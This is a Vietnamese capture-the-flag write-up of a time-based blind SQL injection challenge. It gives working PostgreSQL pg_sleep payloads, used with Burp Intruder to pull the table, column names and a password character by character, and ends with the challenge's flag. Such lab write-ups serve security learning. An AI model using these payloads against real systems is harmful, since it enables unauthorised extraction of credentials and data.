# Challenge: SQL injection - Time based

<img width="1502" height="512" alt="image" src="https://github.com/user-attachments/assets/77db10c9-bb62-44b2-86d2-c0096dcfb0f5" />

Vào Challenge thì cho một giao diện như thế này 

<img width="429" height="260" alt="image" src="https://github.com/user-attachments/assets/a194cb67-6cba-4aa4-8db9-6b9bb4947f3f" />

Trước tiên thì mình thử fuzz bằng một vài payload quen thuộc ở trang Login nhưng không thấy bất kì thứ gì khả nghi , mọi thứ từ không đúng password cho đến sai cấu trúc nó đều trả về thế này 

<img width="453" height="165" alt="image" src="https://github.com/user-attachments/assets/6e23c599-dcb3-459f-bf48-e8e3e552d512" />

Mình thử vào tab member list thì hiện ra một list danh sách user như vậy 

<img width="853" height="411" alt="image" src="https://github.com/user-attachments/assets/431a6bf4-5edd-47e9-8f73-9717fb8a7979" />

 Click đại vào một user thì nó bắt login mới coi được profile 

 <img width="997" height="345" alt="image" src="https://github.com/user-attachments/assets/411a6ce1-67b4-4002-9742-faa28a500f22" />

Nhưng để í ở đây tham số member ở đường dẫn nó nhận giá trị từ bên ngoài vào nhưng nó cũng không trả về bất cứ thứ gì và vẫn bắt chúng ta phải login 

Lúc này phải sử dụng đến time based , trước tiên phải fuzz thử để xác định xem hệ quản trị cơ sở dữ liệu ở phía sau là gì. Ở đây cứ sử dụng lệnh điều kiện , nếu 1=1 thì cho web ngủ 10s còn không thì trả về số 1 hoặc bất cứ thứ gì , bởi vì cho dù có lỗi hay không thì nó vẫn sẽ load xong ngay lập tức mà 
```sql
1 AND (SELECT CASE WHEN 1=1 THEN pg_sleep(10) ELSE NULL END) IS NULL---
```
Và xác định được DBMS đang sử dụng postgresql 

Phần còn lại cũng đơn giản hơn rồi , nhưng nó khá là trâu bò tí thôi. Tiếp theo cần biết tên bảng , nhưng phải xác định tên bảng dài bao nhiêu kí tự đã
```sql
1 AND (SELECT CASE WHEN length((SELECT table_name from information_schema.tables limit 1 OFFSET 0))=1 THEN pg_sleep(10) ELSE NULL END) IS NULL---
```
add to intrusder rồi setting như hình dưới

<img width="1920" height="573" alt="image" src="https://github.com/user-attachments/assets/e6006d9b-fb50-4131-90a7-91e77b394168" />

Kết quả : Chúng ta dựa vào cột Response received , và coi những hàng có số lớn nhất và lớn hơn so với những hàng còn lại . Xác định được độ dài tên bảng dài 5 kí tự

<img width="1803" height="522" alt="image" src="https://github.com/user-attachments/assets/ad9776cf-5434-42f3-a636-b48ea8a21981" />

Tiếp tục , sử dụng hàm substr để xác định từng kí tự trong 5 vị trí của tên bảng 
```sql
1 AND (SELECT CASE WHEN substr((SELECT table_name from information_schema.tables limit 1 OFFSET 0),1,1)=chr(1) THEN pg_sleep(10) ELSE NULL END) IS NULL---
```
Kết quả, tương tự cũng dựa vào cột Response received . Chúng ta có bảng `users` .

<img width="1827" height="330" alt="image" src="https://github.com/user-attachments/assets/116df824-e24d-4932-936f-428dbf267754" />

Tiếp tục lấy tên cột  . Ở đây rút kinh nghiệm , không cần phải xác định có bao nhiêu ký tự trong đó . Chúng ta hãy cho luôn một số vừa đủ lớn rồi chỉ cần sử dụng trong 1 payload . Ko cần làm 2 payload , 1 cái xác định số lượng , 1 cái xác định kí tự
```sql
1 AND (SELECT CASE WHEN substr((SELECT column_name from information_schema.columns limit 1 OFFSET 1),1,1)=chr(1) THEN pg_sleep(10) ELSE NULL END) IS NULL---
```
Kết quả, chúng ta được cột `username`

<img width="1816" height="345" alt="image" src="https://github.com/user-attachments/assets/3d14cd69-6690-4333-9c64-bdf634fa506d" />

Tương tự phía sau có thêm cột với OFFSET 2,3,4 là firstname, lastname,email


Và payload lấy hàng thứ 5 
```sql
1 AND (SELECT CASE WHEN substr((SELECT column_name from information_schema.columns limit 1 OFFSET 5),1,1)=chr(1) THEN pg_sleep(10) ELSE NULL END) IS NULL---
```
Chúng ta có cột password
<img width="1817" height="802" alt="image" src="https://github.com/user-attachments/assets/9e41d3b1-9291-4d31-b9cf-ce9ecdb53518" />

Cuối cùng lấy password thôi 
```sql
1 AND (SELECT CASE WHEN substr((SELECT password from users limit 1 OFFSET 0),4,1)=chr(51) THEN pg_sleep(10) ELSE NULL END) IS NULL---
```
Kết quả chúng ta có được password . Decode ra và sắp xếp lại thôi 

<img width="1830" height="673" alt="image" src="https://github.com/user-attachments/assets/8ce89391-0b50-4ecf-b953-2ad8e4f22366" />

```
T!m3B@s3DSQL!
```

Chúng ta Done Challenge này !
